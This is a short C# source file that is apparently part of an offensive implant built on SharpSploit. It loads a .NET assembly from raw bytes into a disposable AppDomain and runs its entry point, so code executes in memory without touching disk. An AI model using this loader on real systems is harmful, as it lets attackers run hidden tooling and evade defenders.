using System;
using Reflect = System.Reflection;

namespace Drone.SharpSploit.Execution
{
    public static class Assembly
    {
        public static void Execute(byte[] assemblyBytes, string[] args = null)
        {
            if (args == null) args = new string[] { };

            var domain = AppDomain.CreateDomain(Guid.NewGuid().ToShortGuid(), null, null, null, false);
            var proxy = (ShadowRunnerProxy)domain.CreateInstanceAndUnwrap(typeof(ShadowRunnerProxy).Assembly.FullName, typeof(ShadowRunnerProxy).FullName);
            proxy.LoadAssembly(assemblyBytes, args);
            
            AppDomain.Unload(domain);
        }
    }

    public class ShadowRunnerProxy : MarshalByRefObject
    {
        public void LoadAssembly(byte[] bytes, string[] args)
        {
            var asm = Reflect.Assembly.Load(bytes);
            asm.EntryPoint.Invoke(null, new object[] { args });
        }
    }
}